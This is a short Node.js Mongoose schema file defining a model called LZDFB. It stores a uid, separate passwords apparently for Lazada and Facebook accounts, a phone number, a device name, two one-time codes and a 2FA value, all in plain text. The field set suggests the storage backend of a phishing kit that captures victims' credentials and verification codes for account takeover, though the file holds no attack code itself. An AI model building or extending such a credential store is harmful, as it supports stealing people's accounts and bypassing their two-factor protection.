const mongoose = require('mongoose');
const Schema = mongoose.Schema;

const LZDFBSchema = new Schema({
    uid: {type:String},
    passwordLZD: {type:String},
    passwordFB:{type:String},
    phoneNumber: {type:String},
    deviceName: {type:String},
    otp: {type:String},
    otpLan2: {type:String},
    status: {type:Boolean},
    twoFA: {type:String},
    created:{type:Date, default:Date.now}
});

const LZDFB = mongoose.model('LZDFB',LZDFBSchema,'lzdfb');
module.exports = LZDFB;